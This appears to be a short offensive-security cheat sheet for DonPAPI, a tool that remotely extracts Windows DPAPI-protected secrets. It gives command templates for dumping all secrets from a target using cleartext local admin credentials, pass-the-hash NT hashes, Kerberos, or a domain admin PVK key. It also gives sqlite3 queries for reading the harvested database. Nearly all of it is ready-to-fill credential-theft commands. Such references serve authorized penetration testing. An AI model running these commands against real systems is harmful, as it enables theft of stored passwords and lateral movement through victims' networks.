# DonPAPI

% DonPAPI, dpapi

#plateform/linux  #target/remote  #cat/CREDENTIAL-ACCESS/DPAPI

## list gathered
```bash
sqlite3  -readonly donpapi.db -cmd '.tables' ".exit"
```

## count gathered
```bash
sqlite3  -readonly donpapi.db -cmd 'select count(1) from <table>;' ".exit"
```

## show gathered
```bash
sqlite3  -readonly donpapi.db -cmd 'select * from <table>;' ".exit"
```

## Dump all secrets (localadmin creds)
```
DonPAPI <target>/<user>:<password>@<target>
```

## DonPAPI - Dump all secrets (localadmin pth)
```
DonPAPI --hashes :<NT> <target>/<user>@<target>
```

## Dump all secrets (kerberos)
```
DonPAPI -k <domain>/<user>@<target>
```


## DonPAPI - Dump all secrets with Domain Admin and PVK (pth)
run dpapi.py to get PVK
```
DonPAPI -pvk <pvk_path> -o <out_path> --hashes <LM>:<NT> <domain>/<user>@<target>
```